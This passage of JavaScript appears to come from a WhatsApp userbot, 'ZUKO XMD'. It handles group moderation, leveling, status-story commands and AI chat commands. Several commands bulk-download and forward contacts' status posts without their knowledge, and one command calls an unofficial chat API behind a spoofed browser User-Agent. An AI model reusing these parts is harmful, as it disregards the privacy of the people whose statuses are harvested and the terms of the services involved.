  if (!limit || limit < 1) {
    return reply(`📎 Usage: ${prefix}medialimit <count>\nExample: ${prefix}medialimit 5\n\nLimits number of media per user per minute.`)
  }
  
  if (!db.mediaLimit) db.mediaLimit = {}
  db.mediaLimit[m.chat] = limit
  saveDB()
  
  reply(`✅ Media limit set to ${limit} per minute per user.`)
}
break

case 'textlimit':
case 'limittext': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const limit = parseInt(args[0])
  
  if (!limit || limit < 1) {
    return reply(`📝 Usage: ${prefix}textlimit <count>\nExample: ${prefix}textlimit 10\n\nLimits number of text messages per user per minute.`)
  }
  
  if (!db.textLimit) db.textLimit = {}
  db.textLimit[m.chat] = limit
  saveDB()
  
  reply(`✅ Text message limit set to ${limit} per minute per user.`)
}
break

case 'capitallimit':
case 'capblock': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`🔠 Usage: ${prefix}capblock on/off\n\nBlocks messages written in ALL CAPS.`)
  }
  
  setSetting(m.chat, 'blockcaps', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} ALL CAPS message blocking.`)
}
break
// ==================== STATUS/STORY COMMANDS ====================

case 'autoview':
case 'autoviewstatus': {
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`👁️ Usage: ${prefix}autoview on/off\n\nAutomatically views all status updates from contacts.`)
  }
  
  setSetting(m.sender, 'autoViewStatus', mode === 'on')
  reply(`${mode === 'on' ? '✅ Auto-view enabled' : '❌ Auto-view disabled'}. Bot will ${mode === 'on' ? 'automatically view' : 'stop viewing'} all status updates.`)
}
break

case 'autoreactstatus':
case 'statusreact': {
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  const emoji = args[1]
  
  if (mode === 'set' && emoji) {
    setSetting(m.sender, 'statusReactionEmoji', emoji)
    reply(`✅ Status reaction emoji set to: ${emoji}`)
  }
  else if (mode === 'on') {
    setSetting(m.sender, 'autoReactStatus', true)
    reply('✅ Auto-reaction to status updates enabled.')
  }
  else if (mode === 'off') {
    setSetting(m.sender, 'autoReactStatus', false)
    reply('❌ Auto-reaction to status updates disabled.')
  }
  else {
    return reply(`📝 Usage:\n${prefix}statusreact on\n${prefix}statusreact off\n${prefix}statusreact set 😊`)
  }
}
break

case 'viewstatus':
case 'readstatus': {
  if (!isCreator) return reply('❌ Owner only')
  
  if (!m.quoted || m.quoted.remoteJid !== 'status@broadcast') {
    return reply(`👁️ Reply to a status message with: ${prefix}viewstatus\n\nThis will mark that status as viewed.`)
  }
  
  try {
    await empire.readMessages([m.quoted.key])
    reply('✅ Status marked as viewed successfully!')
  } catch (err) {
    reply('❌ Failed to view status.')
  }
}
break

case 'savestatus':
case 'downloadstatus': {
  if (!isCreator) return reply('❌ Owner only')
  
  if (!m.quoted || m.quoted.remoteJid !== 'status@broadcast') {
    return reply(`💾 Reply to a status message with: ${prefix}savestatus\n\nSupported: Images, Videos, Audio, Text, GIFs`)
  }
  
  try {
    const quoted = m.quoted
    const msg = quoted.message
    
    // Helper function to download media
    const downloadMedia = async (message, type) => {
      const stream = await downloadContentFromMessage(message, type)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk])
      }
      return buffer
    }
    
    // Image Status
    if (msg.imageMessage) {
      const buffer = await downloadMedia(msg.imageMessage, 'image')
      const caption = msg.imageMessage.caption || 'Status Image'
      
      await empire.sendMessage(m.chat, {
        image: buffer,
        caption: `📸 *STATUS SAVED*\n\n📝 Caption: ${caption}\n👤 From: ${quoted.sender.split('@')[0]}\n📅 ${new Date().toLocaleString()}`
      }, { quoted: m })
    }
    // Video Status
    else if (msg.videoMessage) {
      const buffer = await downloadMedia(msg.videoMessage, 'video')
      const caption = msg.videoMessage.caption || 'Status Video'
      
      await empire.sendMessage(m.chat, {
        video: buffer,
        caption: `🎥 *STATUS SAVED*\n\n📝 Caption: ${caption}\n👤 From: ${quoted.sender.split('@')[0]}\n📅 ${new Date().toLocaleString()}`
      }, { quoted: m })
    }
    // Audio/Voice Status
    else if (msg.audioMessage) {
      const buffer = await downloadMedia(msg.audioMessage, 'audio')
      
      await empire.sendMessage(m.chat, {
        audio: buffer,
        mimetype: 'audio/mpeg',
        ptt: msg.audioMessage.ptt || false,
        caption: `🎵 *VOICE STATUS SAVED*\n\n👤 From: ${quoted.sender.split('@')[0]}\n📅 ${new Date().toLocaleString()}`
      }, { quoted: m })
    }
    // GIF/Sticker Status
    else if (msg.videoMessage?.gifPlayback || msg.stickerMessage) {
      const buffer = await downloadMedia(msg.videoMessage || msg.stickerMessage, 'video')
      
      await empire.sendMessage(m.chat, {
        video: buffer,
        gifPlayback: true,
        caption: `🎬 *GIF STATUS SAVED*\n\n👤 From: ${quoted.sender.split('@')[0]}\n📅 ${new Date().toLocaleString()}`
      }, { quoted: m })
    }
    // Text Status
    else if (msg.conversation || msg.extendedTextMessage) {
      const text = msg.conversation || msg.extendedTextMessage?.text || ''
      
      reply(`📝 *TEXT STATUS SAVED*\n\n💬 "${text}"\n\n👤 From: ${quoted.sender.split('@')[0]}\n📅 ${new Date().toLocaleString()}`)
    }
    else {
      reply('❌ Unsupported status type.')
    }
    
    // Auto-react after saving
    const autoReact = getSetting(m.sender, 'autoReactStatus', false)
    const reactionEmoji = getSetting(m.sender, 'statusReactionEmoji', '💾')
    
    if (autoReact) {
      await empire.sendMessage('status@broadcast', {
        react: { text: reactionEmoji, key: quoted.key }
      }).catch(() => {})
    }
    
  } catch (err) {
    console.error('Save Status Error:', err)
    reply('❌ Failed to save status. Make sure you replied to a valid status message.')
  }
}
break

case 'savestatusall':
case 'downloadallstatus': {
  if (!isCreator) return reply('❌ Owner only')
  
  reply('⏳ Fetching all recent status updates... This may take a moment.')
  
  try {
    // Get all status messages from store
    const statusMessages = []
    const chats = store.chats
    
    for (const chat of Object.values(chats)) {
      if (chat.id === 'status@broadcast' && chat.messages) {
        const messages = Object.values(chat.messages)
        for (const msg of messages) {
          if (msg.message && !msg.key.fromMe) {
            statusMessages.push(msg)
          }
        }
      }
    }
    
    if (statusMessages.length === 0) {
      return reply('📭 No status updates found.')
    }
    
    let saved = 0
    let failed = 0
    
    for (const msg of statusMessages.slice(-20)) { // Last 20 statuses
      try {
        const message = msg.message
        
        if (message.imageMessage) {
          const stream = await downloadContentFromMessage(message.imageMessage, 'image')
          let buffer = Buffer.from([])
          for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk])
          
          await empire.sendMessage(m.chat, {
            image: buffer,
            caption: `📸 From: ${msg.key.participant?.split('@')[0] || 'Unknown'}`
          })
          saved++
        }
        else if (message.videoMessage && !message.videoMessage.gifPlayback) {
          const stream = await downloadContentFromMessage(message.videoMessage, 'video')
          let buffer = Buffer.from([])
          for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk])
          
          await empire.sendMessage(m.chat, {
            video: buffer,
            caption: `🎥 From: ${msg.key.participant?.split('@')[0] || 'Unknown'}`
          })
          saved++
        }
        else {
          failed++
        }
        
        await sleep(1000) // Delay to avoid rate limiting
        
      } catch (err) {
        failed++
      }
    }
    
    reply(`✅ Status Download Complete!\n\n📸 Saved: ${saved}\n❌ Failed: ${failed}`)
    
  } catch (err) {
    console.error('Save All Status Error:', err)
    reply('❌ Failed to download status updates.')
  }
}
break

case 'statuslist':
case 'liststatus': {
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    const statusSenders = new Set()
    const chats = store.chats
    
    if (chats['status@broadcast']?.messages) {
      const messages = Object.values(chats['status@broadcast'].messages)
      for (const msg of messages) {
        if (msg.key && msg.key.participant && !msg.key.fromMe) {
          statusSenders.add(msg.key.participant)
        }
      }
    }
    
    if (statusSenders.size === 0) {
      return reply('📭 No status updates found from any contacts.')
    }
    
    let list = '📱 *CONTACTS WITH ACTIVE STATUS*\n\n'
    const mentions = []
    
    Array.from(statusSenders).forEach((sender, i) => {
      list += `${i + 1}. @${sender.split('@')[0]}\n`
      mentions.push(sender)
    })
    
    list += `\n📊 Total: ${statusSenders.size} contacts`
    
    await empire.sendMessage(m.chat, {
      text: list,
      mentions: mentions
    }, { quoted: m })
    
  } catch (err) {
    reply('❌ Failed to fetch status list.')
  }
}
break

case 'statusstats':
case 'statusinfo': {
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    const chats = store.chats
    let totalStatuses = 0
    let uniqueSenders = new Set()
    
    if (chats['status@broadcast']?.messages) {
      const messages = Object.values(chats['status@broadcast'].messages)
      totalStatuses = messages.length
      
      for (const msg of messages) {
        if (msg.key && msg.key.participant && !msg.key.fromMe) {
          uniqueSenders.add(msg.key.participant)
        }
      }
    }
    
    const autoView = getSetting(m.sender, 'autoViewStatus', false)
    const autoReact = getSetting(m.sender, 'autoReactStatus', false)
    const reactionEmoji = getSetting(m.sender, 'statusReactionEmoji', '💾')
    
    const stats = `
╭━━━━━━━━━━━━━━━━━━━━━━╮
┃    📊 𝗦𝗧𝗔𝗧𝗨𝗦 𝗦𝗧𝗔𝗧𝗦    ┃
┣━━━━━━━━━━━━━━━━━━━━━━┫
┃ 📱 Total Statuses: ${totalStatuses}
┃ 👥 Unique Contacts: ${uniqueSenders.size}
┃ 👁️ Auto-View: ${autoView ? '✅ On' : '❌ Off'}
┃ ❤️ Auto-React: ${autoReact ? '✅ On' : '❌ Off'}
┃ 😊 React Emoji: ${reactionEmoji}
┃ 💾 Save Command: ${prefix}savestatus
┃ 📥 Save All: ${prefix}savestatusall
┣━━━━━━━━━━━━━━━━━━━━━━┫
┃    💫 𝗭𝗨𝗞𝗢 𝗫𝗠𝗗 𝗩𝟰     ┃
╰━━━━━━━━━━━━━━━━━━━━━━╯
    `.trim()
    
    reply(stats)
  } catch (err) {
    reply('❌ Failed to fetch status statistics.')
  }
}
break

case 'statusforward':
case 'forwardstatus': {
  if (!isCreator) return reply('❌ Owner only')
  
  if (!m.quoted || m.quoted.remoteJid !== 'status@broadcast') {
    return reply(`📤 Reply to a status message with: ${prefix}forwardstatus <@user>\n\nForwards the status to a specific user.`)
  }
  
  let target = m.mentionedJid[0]
  if (!target && args[0]) {
    target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  }
  
  if (!target) {
    return reply(`📤 Usage: ${prefix}forwardstatus @user\n\nForward status to a specific contact.`)
  }
  
  try {
    await empire.sendMessage(target, {
      forward: m.quoted.key
    })
    
    reply(`✅ Status forwarded to @${target.split('@')[0]}`, { mentions: [target] })
  } catch (err) {
    reply('❌ Failed to forward status.')
  }
}
break

case 'statusreply':
case 'replystatus': {
  if (!isCreator) return reply('❌ Owner only')
  
  if (!m.quoted || m.quoted.remoteJid !== 'status@broadcast') {
    return reply(`💬 Reply to a status message with: ${prefix}replystatus <message>\n\nReplies to the status sender privately.`)
  }
  
  const replyMsg = text
  if (!replyMsg) {
    return reply(`💬 Usage: ${prefix}replystatus <your message>\n\nSends a private reply to the status sender.`)
  }
  
  const sender = m.quoted.key.participant || m.quoted.key.remoteJid
  
  try {
    await empire.sendMessage(sender, {
      text: `📱 *Reply to your status*\n\n${replyMsg}\n\n- Sent via ZUKO XMD Bot`
    })
    
    reply(`✅ Reply sent to @${sender.split('@')[0]}`, { mentions: [sender] })
  } catch (err) {
    reply('❌ Failed to send reply.')
  }
}
break

case 'statusclean':
case 'clearoldstatus': {
  if (!isCreator) return reply('❌ Owner only')
  
  const hours = parseInt(args[0]) || 24
  
  reply(`⏳ Cleaning status updates older than ${hours} hours...`)
  
  try {
    // Status cleanup is handled automatically by WhatsApp
    // This command just clears local cache
    if (store.chats['status@broadcast']) {
      // Clear local status cache
      store.chats['status@broadcast'].messages = {}
    }
    
    reply(`✅ Status cache cleared. Old statuses removed from local storage.`)
  } catch (err) {
    reply('❌ Failed to clear status cache.')
  }
}
break

case 'statusmute':
case 'mutestatus': {
  if (!isCreator) return reply('❌ Owner only')
  
  const jid = args[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  
  if (!jid) {
    return reply(`🔇 Usage: ${prefix}mutestatus @user\n\nMutes status updates from a specific contact.`)
  }
  
  if (!db.mutedStatus) db.mutedStatus = []
  
  if (db.mutedStatus.includes(jid)) {
    db.mutedStatus = db.mutedStatus.filter(id => id !== jid)
    reply(`✅ Status updates from @${jid.split('@')[0]} unmuted.`, { mentions: [jid] })
  } else {
    db.mutedStatus.push(jid)
    reply(`🔇 Status updates from @${jid.split('@')[0]} muted.`, { mentions: [jid] })
  }
  
  saveDB()
}
break

case 'statusmutedlist':
case 'listmutestatus': {
  if (!isCreator) return reply('❌ Owner only')
  
  const muted = db.mutedStatus || []
  if (!muted.length) return reply('📭 No muted status contacts.')
  
  let list = '🔇 *MUTED STATUS CONTACTS*\n\n'
  const mentions = []
  
  muted.forEach((jid, i) => {
    list += `${i + 1}. @${jid.split('@')[0]}\n`
    mentions.push(jid)
  })
  
  await empire.sendMessage(m.chat, {
    text: list,
    mentions: mentions
  }, { quoted: m })
}
break

case 'statusdownloader':
case 'statusdl': {
  if (!isCreator) return reply('❌ Owner only')
  
  const type = args[0]?.toLowerCase()
  
  if (!type || !['image', 'video', 'all'].includes(type)) {
    return reply(`📥 Usage: ${prefix}statusdl image\n${prefix}statusdl video\n${prefix}statusdl all\n\nDownloads specific type of status updates.`)
  }
  
  reply(`⏳ Downloading ${type} status updates...`)
  
  try {
    const chats = store.chats
    let downloaded = 0
    
    if (chats['status@broadcast']?.messages) {
      const messages = Object.values(chats['status@broadcast'].messages)
      
      for (const msg of messages.slice(-30)) {
        const message = msg.message
        
        if (type === 'image' && message.imageMessage) {
          const stream = await downloadContentFromMessage(message.imageMessage, 'image')
          let buffer = Buffer.from([])
          for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk])
          
          await empire.sendMessage(m.chat, {
            image: buffer,
            caption: `📸 Status Image from @${msg.key.participant?.split('@')[0]}`
          })
          downloaded++
        }
        else if (type === 'video' && message.videoMessage && !message.videoMessage.gifPlayback) {
          const stream = await downloadContentFromMessage(message.videoMessage, 'video')
          let buffer = Buffer.from([])
          for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk])
          
          await empire.sendMessage(m.chat, {
            video: buffer,
            caption: `🎥 Status Video from @${msg.key.participant?.split('@')[0]}`
          })
          downloaded++
        }
        else if (type === 'all') {
          if (message.imageMessage || message.videoMessage) {
            const mediaType = message.imageMessage ? 'image' : 'video'
            const stream = await downloadContentFromMessage(message.imageMessage || message.videoMessage, mediaType)
            let buffer = Buffer.from([])
            for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk])
            
            await empire.sendMessage(m.chat, {
              [mediaType]: buffer,
              caption: `📱 Status from @${msg.key.participant?.split('@')[0]}`
            })
            downloaded++
          }
        }
        
        await sleep(1000)
      }
    }
    
    reply(`✅ Downloaded ${downloaded} ${type} status updates.`)
  } catch (err) {
    reply('❌ Failed to download status updates.')
  }
}
break
case 'emojilimit':
case 'banemoji': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const action = args[0]?.toLowerCase()
  const emoji = args[1]
  
  if (!db.bannedEmojis) db.bannedEmojis = {}
  if (!db.bannedEmojis[m.chat]) db.bannedEmojis[m.chat] = []
  
  if (action === 'add' && emoji) {
    if (!db.bannedEmojis[m.chat].includes(emoji)) {
      db.bannedEmojis[m.chat].push(emoji)
      saveDB()
      reply(`✅ Banned emoji: ${emoji}`)
    } else {
      reply(`⚠️ ${emoji} is already banned.`)
    }
  }
  else if (action === 'remove' && emoji) {
    db.bannedEmojis[m.chat] = db.bannedEmojis[m.chat].filter(e => e !== emoji)
    saveDB()
    reply(`✅ Unbanned emoji: ${emoji}`)
  }
  else if (action === 'list') {
    const emojis = db.bannedEmojis[m.chat]
    if (!emojis.length) return reply('✅ No banned emojis.')
    reply(`🚫 *Banned Emojis*\n\n${emojis.join(', ')}`)
  }
  else {
    reply(`📝 Usage:\n${prefix}banemoji add 🚫\n${prefix}banemoji remove 🚫\n${prefix}banemoji list`)
  }
}
break

case 'whitelist':
case 'trusteduser': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const action = args[0]?.toLowerCase()
  let user = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  
  if (!user || !action) {
    return reply(`📝 Usage:\n${prefix}whitelist add @user\n${prefix}whitelist remove @user\n${prefix}whitelist list`)
  }
  
  if (!db.whitelist) db.whitelist = {}
  if (!db.whitelist[m.chat]) db.whitelist[m.chat] = []
  
  if (action === 'add') {
    if (!db.whitelist[m.chat].includes(user)) {
      db.whitelist[m.chat].push(user)
      saveDB()
      reply(`✅ @${user.split('@')[0]} added to whitelist.`, { mentions: [user] })
    } else {
      reply(`⚠️ @${user.split('@')[0]} is already whitelisted.`, { mentions: [user] })
    }
  }
  else if (action === 'remove') {
    db.whitelist[m.chat] = db.whitelist[m.chat].filter(u => u !== user)
    saveDB()
    reply(`✅ @${user.split('@')[0]} removed from whitelist.`, { mentions: [user] })
  }
  else if (action === 'list') {
    const users = db.whitelist[m.chat]
    if (!users.length) return reply('✅ No whitelisted users.')
    
    let list = '👑 *WHITELISTED USERS*\n\n'
    const mentions = []
    users.forEach((u, i) => {
      list += `${i + 1}. @${u.split('@')[0]}\n`
      mentions.push(u)
    })
    await empire.sendMessage(m.chat, { text: list, mentions: mentions }, { quoted: m })
  }
}
break

case 'blacklist':
case 'blockeduser': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const action = args[0]?.toLowerCase()
  let user = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  
  if (!user || !action) {
    return reply(`📝 Usage:\n${prefix}blacklist add @user\n${prefix}blacklist remove @user\n${prefix}blacklist list`)
  }
  
  if (!db.blacklist) db.blacklist = {}
  if (!db.blacklist[m.chat]) db.blacklist[m.chat] = []
  
  if (action === 'add') {
    if (!db.blacklist[m.chat].includes(user)) {
      db.blacklist[m.chat].push(user)
      saveDB()
      reply(`🚫 @${user.split('@')[0]} added to blacklist.`, { mentions: [user] })
    } else {
      reply(`⚠️ @${user.split('@')[0]} is already blacklisted.`, { mentions: [user] })
    }
  }
  else if (action === 'remove') {
    db.blacklist[m.chat] = db.blacklist[m.chat].filter(u => u !== user)
    saveDB()
    reply(`✅ @${user.split('@')[0]} removed from blacklist.`, { mentions: [user] })
  }
  else if (action === 'list') {
    const users = db.blacklist[m.chat]
    if (!users.length) return reply('✅ No blacklisted users.')
    
    let list = '🚫 *BLACKLISTED USERS*\n\n'
    const mentions = []
    users.forEach((u, i) => {
      list += `${i + 1}. @${u.split('@')[0]}\n`
      mentions.push(u)
    })
    await empire.sendMessage(m.chat, { text: list, mentions: mentions }, { quoted: m })
  }
}
break

case 'modlog':
case 'moderationlog': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  if (!db.modLog) db.modLog = {}
  if (!db.modLog[m.chat]) db.modLog[m.chat] = []
  
  const limit = parseInt(args[0]) || 10
  
  const logs = db.modLog[m.chat].slice(-limit)
  if (!logs.length) return reply('📋 No moderation logs found.')
  
  let logText = '📋 *MODERATION LOGS*\n\n'
  logs.forEach((log, i) => {
    logText += `${i + 1}. ${log.action}\n   👤 ${log.moderator}\n   📅 ${new Date(log.time).toLocaleString()}\n\n`
  })
  
  reply(logText.slice(0, 4000))
}
break

case 'addmodlog':
case 'logaction': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const action = args.join(' ')
  if (!action) return reply(`📝 Usage: ${prefix}logaction <action description>`)
  
  if (!db.modLog) db.modLog = {}
  if (!db.modLog[m.chat]) db.modLog[m.chat] = []
  
  db.modLog[m.chat].push({
    action: action,
    moderator: m.sender,
    time: Date.now()
  })
  
  if (db.modLog[m.chat].length > 100) {
    db.modLog[m.chat] = db.modLog[m.chat].slice(-100)
  }
  
  saveDB()
  reply('✅ Action logged successfully.')
}
break

case 'clearlogs':
case 'resetlogs': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  if (args[0] === 'confirm') {
    if (db.modLog) db.modLog[m.chat] = []
    saveDB()
    reply('✅ Moderation logs cleared.')
  } else {
    reply(`⚠️ This will clear all moderation logs. Type: ${prefix}clearlogs confirm`)
  }
}
break
case 'antilinkcustom': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const action = args[0]?.toLowerCase()
  const domain = args[1]?.toLowerCase()
  
  if (!db.blockedDomains) db.blockedDomains = {}
  if (!db.blockedDomains[m.chat]) db.blockedDomains[m.chat] = []
  
  if (action === 'add' && domain) {
    if (!db.blockedDomains[m.chat].includes(domain)) {
      db.blockedDomains[m.chat].push(domain)
      saveDB()
      reply(`✅ Added "${domain}" to blocked domains list.`)
    } else {
      reply(`⚠️ "${domain}" is already blocked.`)
    }
  }
  else if (action === 'remove' && domain) {
    if (db.blockedDomains[m.chat].includes(domain)) {
      db.blockedDomains[m.chat] = db.blockedDomains[m.chat].filter(d => d !== domain)
      saveDB()
      reply(`✅ Removed "${domain}" from blocked domains.`)
    } else {
      reply(`⚠️ "${domain}" not found in blocked domains.`)
    }
  }
  else if (action === 'list') {
    const domains = db.blockedDomains[m.chat]
    if (!domains.length) return reply('✅ No blocked domains configured.')
    reply(`🚫 *Blocked Domains*\n\n${domains.map((d, i) => `${i + 1}. ${d}`).join('\n')}`)
  }
  else {
    reply(`📝 Usage:\n${prefix}antilinkcustom add <domain>\n${prefix}antilinkcustom remove <domain>\n${prefix}antilinkcustom list`)
  }
}
break

case 'slowmode': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const seconds = parseInt(args[0])
  
  if (isNaN(seconds) || seconds < 0) {
    return reply(`⏰ Usage: ${prefix}slowmode <seconds>\nExample: ${prefix}slowmode 5\nUse 0 to disable.`)
  }
  
  setSetting(m.chat, 'slowmode', seconds)
  
  if (seconds === 0) {
    reply('✅ Slow mode disabled.')
  } else {
    reply(`🐢 Slow mode enabled. Members can send messages every ${seconds} second(s).`)
  }
}
break

case 'leveling': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`📝 Usage: ${prefix}leveling on/off`)
  }
  
  setSetting(m.chat, 'leveling', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} leveling system. Members will gain XP for messages.`)
}
break

case 'rank':
case 'level': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  
  let user = m.mentionedJid[0] || m.sender
  const leveling = getSetting(m.chat, 'leveling', false)
  
  if (!leveling) {
    return reply('⚠️ Leveling system is disabled in this group.')
  }
  
  if (!db.xp) db.xp = {}
  if (!db.xp[m.chat]) db.xp[m.chat] = {}
  if (!db.xp[m.chat][user]) db.xp[m.chat][user] = { xp: 0, level: 1 }
  
  const userData = db.xp[m.chat][user]
  const nextLevelXP = userData.level * 1000
  const progress = Math.floor((userData.xp / nextLevelXP) * 100)
  
  const rankEmojis = ['🟤', '⚪', '🟢', '🔵', '🟣', '🟡', '🔴', '💎', '👑']
  const rankNames = ['Dirt', 'Stone', 'Bronze', 'Silver', 'Gold', 'Platinum', 'Diamond', 'Master', 'Grandmaster']
  let rankIndex = Math.floor(userData.level / 10)
  if (rankIndex >= rankNames.length) rankIndex = rankNames.length - 1
  
  const rankCard = `
╭━━━━━━━━━━━━━━━━━━━━━━╮
┃    📊 𝗥𝗔𝗡𝗞 𝗖𝗔𝗥𝗗     ┃
┣━━━━━━━━━━━━━━━━━━━━━━┫
┃ 👤 @${user.split('@')[0]}
┃ 🏆 ${rankEmojis[rankIndex]} ${rankNames[rankIndex]}
┃ 📈 Level ${userData.level}
┃ ⭐ XP: ${userData.xp}/${nextLevelXP}
┃ 📊 Progress: ${progress}% 
┃ ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┣━━━━━━━━━━━━━━━━━━━━━━┫
┃    💫 𝗭𝗨𝗞𝗢 𝗫𝗠𝗗 𝗩𝟰     ┃
╰━━━━━━━━━━━━━━━━━━━━━━╯
  `.trim()
  
  await empire.sendMessage(m.chat, {
    text: rankCard,
    mentions: [user]
  }, { quoted: m })
}
break

case 'leaderboard':
case 'top': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  
  const leveling = getSetting(m.chat, 'leveling', false)
  if (!leveling) return reply('⚠️ Leveling system is disabled in this group.')
  
  if (!db.xp?.[m.chat]) return reply('❌ No data available yet.')
  
  const sorted = Object.entries(db.xp[m.chat])
    .sort((a, b) => b[1].xp - a[1].xp)
    .slice(0, 10)
  
  if (!sorted.length) return reply('❌ No ranking data available.')
  
  let leaderText = '🏆 *TOP 10 RANKS* 🏆\n\n'
  const mentions = []
  
  sorted.forEach(([user, data], i) => {
    leaderText += `${i + 1}. @${user.split('@')[0]} - Level ${data.level} (${data.xp} XP)\n`
    mentions.push(user)
  })
  
  await empire.sendMessage(m.chat, {
    text: leaderText,
    mentions: mentions
  }, { quoted: m })
}
break

case 'setrank':
case 'setlevel': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  let user = m.mentionedJid[0]
  let level = parseInt(args[1])
  
  if (!user || !level || level < 1) {
    return reply(`📝 Usage: ${prefix}setlevel @user <level>\nExample: ${prefix}setlevel @user 10`)
  }
  
  if (!db.xp) db.xp = {}
  if (!db.xp[m.chat]) db.xp[m.chat] = {}
  if (!db.xp[m.chat][user]) db.xp[m.chat][user] = { xp: 0, level: 1 }
  
  db.xp[m.chat][user].level = level
  db.xp[m.chat][user].xp = (level - 1) * 1000
  saveDB()
  
  reply(`✅ @${user.split('@')[0]} level set to ${level}.`, { mentions: [user] })
}
break

case 'resetrank':
case 'resetlevel': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  let user = m.mentionedJid[0]
  
  if (!user) {
    return reply(`📝 Usage: ${prefix}resetlevel @user\nUse "all" to reset all members.`)
  }
  
  if (user === 'all') {
    db.xp[m.chat] = {}
    saveDB()
    reply('✅ Reset levels for all members.')
  } else {
    if (db.xp?.[m.chat]?.[user]) {
      delete db.xp[m.chat][user]
      saveDB()
      reply(`✅ Reset level for @${user.split('@')[0]}.`, { mentions: [user] })
    } else {
      reply(`⚠️ @${user.split('@')[0]} has no level data.`, { mentions: [user] })
    }
  }
}
break
// ==================== AI COMMANDS ====================

case 'ai':
case 'ask':
case 'gpt': {
  if (!text) return reply(`🤖 Usage: ${prefix}ai <question>\n\nExample: ${prefix}ai What is artificial intelligence?`)
  
  await empire.sendMessage(m.chat, { react: { text: '🤔', key: m.key } })
  
  try {
    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{
        pluginId: null,
        content: text,
        role: "user"
      }],
      prompt: "You are ZUKO XMD, a helpful WhatsApp bot assistant. Be friendly, concise, and helpful.",
      temperature: 0.7
    }, {
      headers: {
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
      }
    })
    
    const answer = response.data
    await empire.sendMessage(m.chat, {
      text: `╭━━〔 🤖 ZUKO AI 〕━━╮\n│\n│ 💬 *Question:*\n│ ${text}\n│\n│ ✨ *Answer:*\n│ ${answer}\n│\n╰━━━━━━━━━━━━━━━━╯`
    }, { quoted: m })
    
    await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
  } catch (err) {
    console.error('AI Error:', err)
    reply('❌ AI service unavailable. Please try again later.')
  }
}
break

case 'gpt4':
case 'chatgpt4': {
  if (!text) return reply(`🧠 Usage: ${prefix}gpt4 <question>\n\nExample: ${prefix}gpt4 Explain quantum computing`)
  
  await empire.sendMessage(m.chat, { react: { text: '🧠', key: m.key } })
  
  try {
    const response = await axios.get(`https://apis.prexzyvilla.site/ai/gpt4?text=${encodeURIComponent(text)}`)
    
    if (response.data && response.data.status) {
      const answer = response.data.data || response.data.result
      
      const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer]
      for (let i = 0; i < chunks.length; i++) {
        const header = i === 0 ? `🧠 *GPT-4 RESPONSE*\n\n` : `📄 *Continued...*\n\n`
        await empire.sendMessage(m.chat, { text: header + chunks[i] }, { quoted: m })
      }
    } else {
      reply('❌ Failed to get response from GPT-4.')
    }
  } catch (err) {
    console.error('GPT4 Error:', err)
    reply('❌ GPT-4 service error. Try again later.')
  }
}
break

case 'gemini':
case 'googleai': {
  if (!text) return reply(`🌟 Usage: ${prefix}gemini <question>\n\nExample: ${prefix}gemini Write a poem about nature`)
  
  await empire.sendMessage(m.chat, { react: { text: '🌟', key: m.key } })
  
  try {
    const response = await axios.get(`https://apis.prexzyvilla.site/ai/gemini?text=${encodeURIComponent(text)}`)
    
    if (response.data && response.data.status) {
      const answer = response.data.data || response.data.result
      
      await empire.sendMessage(m.chat, {
        text: `╭━━〔 🌟 GEMINI AI 〕━━╮\n│\n│ 💭 ${text}\n│\n│ ✨ ${answer}\n│\n╰━━━━━━━━━━━━━━━━╯`
